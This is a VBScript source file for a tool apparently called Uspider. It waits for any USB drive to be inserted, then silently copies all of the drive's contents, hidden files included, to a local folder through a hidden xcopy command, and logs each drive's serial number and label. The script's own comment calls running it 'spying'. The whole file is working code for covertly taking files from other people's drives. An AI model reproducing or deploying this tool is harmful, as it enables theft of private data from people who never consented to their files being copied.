' Uspider v2.0.2 by codgician
' ====================================
' The brand new Uspider, more classy than ever.
' With great power comes great responsibility. DO NOT BE EVIL.
' Lincensed under MIT License.
' URL: https://github.com/codgician/USpider

Class Uspider

    Private colEvents, objFileSystem, objWMIService, objWScriptShell
    Public customList, destDir, isBlackList, logging, logDir, logName, separateFolders, xcopyParameters
    
    Private Sub Class_Initialize()
        Set objFileSystem = CreateObject("Scripting.FileSystemObject")
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set objWScriptShell = CreateObject("WScript.Shell")
        Set colEvents = objWMIService.ExecNotificationQuery _
            ("Select * From __InstanceOperationEvent Within 10 Where TargetInstance isa 'Win32_LogicalDisk'")
    End Sub

    Private Sub Class_Terminate()
        Set objFileSystem = Nothing
        Set objWMIService = Nothing
        Set objWScriptShell = Nothing
        Set colEvents = Nothing
    End Sub
    
    Private Function checkList(objTargetDevice)
        ' Check if the device is in custom list.
        isIncluded = false
        If IsEmpty(isBlackList) = false and IsEmpty(customList) = false Then
            If InStr(customList, objTargetDevice.VolumeSerialNumber) > 0 Then
                isIncluded = true
            End If
                        
            log "Custom List Found! isIncluded = " & isIncluded

            If isIncluded = isBlackList Then
                log "Initialize copying..."
                checkList = true
            Else
                log "Skip copying..."
                checkList = false
            End If
        Else
            log "No list detected. Skip checking..."
            checkList = true
        End If
    End Function
    
    Private Function xcopy(objTargetDevice, destDir)
        ' Initialize Destination Folder.
        If objFileSystem.folderExists(destDir) = false Then
            objFileSystem.CreateFolder(destDir)
            If objFileSystem.folderExists(destDir) <> true  Then
                MsgBox "Uspider", vbCritical + vbOKOnly, "Failed to create destination directory." + chr(13) + "Uspider will now exit..."
                WScript.Quit
            End If
        End If
        
        ' Initialize Work Folder.
        If separateFolders = true Then
            subDir = objTargetDevice.VolumeSerialNumber
            
            If IsEmpty(subDir) = true Then
                subDir = "UNKNOWN"
            End If
            
            workDir = destDir + "\" + subDir
        Else
            workDir = destDir
        End If
                        
        If objFileSystem.folderExists(workDir) = false Then
            objFileSystem.CreateFolder(workDir)

            If objFileSystem.folderExists(workDir) <> true  Then
                MsgBox "Uspider", vbCritical + vbOKOnly, "Failed to create work directory." + chr(13) + "Uspider will now exit..."
                WScript.Quit
            End If
        End If
        
        ' Execute copying.
        copyCommand = "cmd.exe /c xcopy " + objTargetDevice.DeviceId + "\* " + workDir + " " + xcopyParameters
        objWScriptShell.Run(copyCommand), 0, false
        
        log "Started copying. Executed command: " & copyCommand
    End Function
    
    Private Function log(logText)
        ' Check if logging is on.
        If logging <> true Then
            Exit Function
        End If
        
        ' Initialize logging.
        If objFileSystem.folderExists(logDir) <> true  Then
            objFileSystem.CreateFolder(logDir)

            ' Check whether success.
            If objFileSystem.folderExists(logDir) <> true  Then
                MsgBox "Uspider", vbCritical + vbOKOnly, "Failed to create log directory." + chr(13) + "Uspider will now exit..."
                WScript.Quit
            End If
        End If

        If objFileSystem.FileExists(logDir + "\" + logName) <> true  Then
            Set objLogFile = objFileSystem.CreateTextFile(logDir + "\" + logName)           
            objLogFile.Close

            ' Check whether success.
            If objFileSystem.FileExists(logDir + "\" + logName) <> true  Then
                MsgBox "Uspider", vbCritical + vbOKOnly, "Failed to create log file." + chr(13) + "Uspider will now exit..."
                WScript.Quit
            End If
        End If
        
        Set objLogFile = objFileSystem.OpenTextFile(logDir + "\" + logName, 8, True)
        objLogFile.Write("[" & Now & "] " & logText) & vbcrlf
        objLogFile.Close
    End Function
    
    Private Function watchDog()
        log "Watch dog started..."

        Do While True
            Set objEvent = colEvents.NextEvent
            Set objTargetDevice = objEvent.TargetInstance
            
            ' Check if the target device type is Removable Device (DriveType = 2).
            If objTargetDevice.DriveType = 2 Then
                Select Case objEvent.Path_.Class
                    ' On Insertion
                    Case "__InstanceCreationEvent"
                        log "New Device Inserted. DeviceID: " & objTargetDevice.DeviceId & _
                            " | Label: " & objTargetDevice.VolumeName & " | SN:" & objTargetDevice.VolumeSerialNumber

                        If checkList(objTargetDevice) = true Then
                            xcopy objTargetDevice, destDir
                        End If
                        
                    ' On Removal
                    Case "__InstanceDeletionEvent"
                        log "Device Removed. DeviceID: " & objTargetDevice.DeviceId & _
                            " | Label: " & objTargetDevice.VolumeName & " | SN:" & objTargetDevice.VolumeSerialNumber
                End Select
            End If
        Loop
    End Function
    
    Public Function Init()
        ' Format directory string
        If Right(destDir, 1) = "\" Then
            destDir = Left(destDir, len(destDir) - 1)
        End If
        If Right(logDir, 1) = "\" Then
            logDir = Left(logDir, len(logDir) - 1)
        End If

        log "Initialization Finished."
        watchDog()
    End Function

End Class

' --------------------
'  Main Script
' --------------------

Set Spider = New Uspider

' Configurations
' Please check out our wiki:
' https://github.com/codgician/Uspider/wiki
Spider.destDir = "D:\Uspider"
Spider.separateFolders = true
Spider.xcopyParameters = "/d /e /r /y /h"
Spider.customList = ""
Spider.isBlackList = false
Spider.logging = true
Spider.logDir = "D:"
Spider.logName = "USpiderLog.txt"

' Start spying!
Spider.Init()
